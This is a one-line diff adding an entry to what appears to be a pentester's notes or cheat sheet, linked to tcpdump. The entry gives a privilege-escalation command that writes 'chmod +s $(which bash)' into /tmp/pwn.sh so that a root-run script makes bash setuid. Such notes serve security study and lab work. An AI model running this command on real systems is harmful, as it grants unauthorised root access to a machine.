@@ -1,0 +1,1 @@
+- if you have execute permissions as root, you can do as this [[tcpdump]]. which is `echo 'chmod +s $(which bash)' > /tmp/pwn.sh`.
